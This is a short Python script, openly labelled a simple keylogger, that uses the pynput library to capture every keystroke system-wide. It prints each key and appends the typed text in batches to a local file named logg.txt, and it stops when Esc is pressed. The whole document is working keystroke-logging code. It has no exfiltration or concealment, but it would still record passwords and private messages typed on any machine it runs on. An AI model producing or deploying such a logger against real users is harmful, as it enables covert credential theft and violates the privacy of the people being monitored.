#Just a simple keylogger using module pynput

import pynput
from pynput.keyboard import Key, Listener


count = 0
keys = []


def press(key): 
    global keys, count
    keys.append(key)
    count += 1    
    print("{0} pressed".format(key))
    if count>= 10:
        count = 0
        write(keys)
        keys = []


def write(keys):
    with open("logg.txt", "a") as f:
        for key in keys: 
            k = str(key).replace("'","")    #to remove all the single quotes and blank spaces
            if k.find("space") > 0:         #if there is a space then instead of key.space it will print "new line" 
                f.write(' ')
            elif k.find("enter") > 0:       #if user presses enter button it will go to the next line instead of giving input as key.enter
                f.write('\n')
            elif k.find("tab")>0:           #if user presses tab then it will give "   " instead of key.tab
                f.write('   ')
            elif k.find("Key") == -1:
                f.write(k)


def release(key):                           #this function is for esc. the program

    if key == Key.esc:
        return False

with Listener(on_press =press, on_release =release) as listener:
    listener.join()
    
